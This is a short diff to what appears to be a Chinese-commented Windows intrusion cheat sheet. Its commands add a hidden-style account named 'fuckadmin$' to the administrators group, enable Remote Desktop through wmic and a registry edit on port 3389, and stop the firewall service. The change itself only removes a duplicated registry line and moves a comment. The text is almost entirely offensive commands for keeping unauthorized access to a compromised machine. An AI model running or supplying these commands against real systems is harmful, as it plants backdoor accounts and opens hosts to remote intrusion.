@@ -66,11 +66,8 @@ net localgroup administrators fuckadmin$ /add  #添加fuckadmin$到管理员组
 
 wmic path win32_terminalservicesetting where (__CLASS != "") call setallowtsconnections 1    #一键开启远程桌面命令,需要administrator及以上
 
-注册表开启3389
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
-
-
-reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+#注册表开启3389
 
 net stop sharedaccess   #关闭防火墙 
 
